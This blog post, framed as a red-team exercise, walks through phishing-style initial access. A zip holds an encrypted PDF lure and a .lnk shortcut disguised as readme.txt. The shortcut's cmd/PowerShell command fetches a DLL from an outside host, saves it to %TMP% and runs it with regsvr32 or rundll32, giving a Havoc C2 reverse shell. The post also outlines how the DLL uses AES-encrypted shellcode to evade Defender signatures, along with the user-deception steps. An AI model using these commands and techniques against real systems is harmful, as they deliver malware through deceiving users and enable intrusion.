---
title: "Initial Access Simulation" 
layout: "post"
---

In this specific scenario we will try to experiment and simulate a malware payload delivery using the following technique frequently used by Threat Actors (TA): 

- Zip Folder
- .LNK file execution
- DLL Execution 
- Havoc C2C comunications

We will discuss a simple, minimal and baseline approach and we will take into account fews considerations regarding the initial access aspects. 



In normal red team campain it is paramount to find a way to deliver the malicious payload and force the user to interact with our files. 
For this reason, in this particular scenario, we will try to simulate a .zip delivery containing two distinct file. 
The firs file inside the `.zip` will be an encrypted PDF document (sign contract, legal document, CV, just use your immagination), the second one will be a `.lnk` shortcut file masquerade as a text file (`readme.txt`). 
The idea here is the following: the user receive the files (could be via email or via MS Teams) and try to open up the encrypted pdf, which will ask the user to specify a password and then the user will open up the fake notepad file to recover the original PDF's password. 
By doint so the `.lnk` shortcut file in the background will execute the tasks necessary to deliver and execute our malicious DLL.  

<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/Invoice.PNG">
</p>



## 1) Introduction Initial Access 

Initial Access involves a range of techniques employed by threat actors to establish their initial presence within a target network. 
These methods encompass various entry vectors that serve as a foothold into the network. 
One particularly relevant technique is the employment of targeted spear-phishing campaigns. 
In these campaigns, attackers meticulously craft deceptive emails tailored to deceive recipients, often leading them to unknowingly disclose sensitive credentials or execute malicious attachments. 

This tactic holds significant relevance as successful spear-phishing attempts can grant attackers direct access to a network, bypassing many traditional security measures. 
In addition, threat actors frequently exploit vulnerabilities present in public-facing web servers to penetrate the network's defenses. It's noteworthy that initial access points gained through these techniques could grant ongoing access, such as using compromised accounts and external remote services. 

However, the effectiveness of these access points might diminish due to changing passwords or other security measures. 
Analyzing historical attacks by prominent threat actors reveals that these tactics are recurrently employed to breach networks, underscoring the significance of robust initial access security measures."


 



## 2) Defender Bypass Payload

We are not going into details on how we created this stealth DLL payload in this blogpost. 
Is it obviously possible to used any payload you want, the only assumption is that the paylod itself must be undetected by Defender AV and static signature. 
The DLL itself is pretty simple and perform the classic injection using the VirtualAlloc Windows API. 
However, to bypass static signature, the shellcode is encrypted with AES. 
Inside the DLL we have also included the AES Key to decrypt the shellcode as well as the AES Decryption. 

__Note:__ Since we are saving a payload into the disk we don't need to worry about AMSI at this stage. We are not operating in memory even though this can be considered not OPSEC safe. 



## 3) Weaponize Payload Delivery with LNK 

Firt of all we need to create a shortcut file that will be delivered with the encrypted PDF. Right click on your Desktop, click on create shortcut and you must enter the full path of `cmd.exe`, in this case it will be `C:\Windows\System32\cmd.exe`. After that we can specify readme.txt as a shortcut name. (remember we want the user to click on the shortcut file thinking it is a text file with the password inside). Now we need to click on the shortcut properties and changhe the icon to match to notepad.txt (default windows text editor). 

Now we can add the powershell command to download the DLL from a remote location. This must be specified inside the shortcut target menu interface. Then we can specify the output where to save the `.dll` file. For this we will leverage the `%TMP%` environment variable of Windows so we don't even need to know the local user accoun name and path. 

The full command specified inside the shortcut file is the following: 

```powershell 
C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && regsvr32 %TMP%\h.dll 
```
__Note:__ The powershell download can be performed with the usual suspect IEX Download String function


Upon executing the `readme.txt` file on the attacker machine we can see a web request on the webserver. 

<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/down.JPG">
</p>

Furthermore, as soon as the file is downloaded and executed we can see our reverse shellcode in the Havoc C2C framework. 


<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/hav1.JPG">
</p>

With some modification on the `.dll` file we can also perform the same activity using the `rundll32` windows binary. 


```powershell 
C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && rundll32 %TMP%\h.dll 
```
The command is pretty similar even though in this case we need to specify the export function name declared in our `.dll`



## 4) Conclusion and Limitation

- Email gateway scanner 
- Proxy communications 
- PackMyPayload https://github.com/mgeeky/PackMyPayload


## References 

- https://www.truesec.com/hub/blog/darkgate-loader-delivered-via-teams
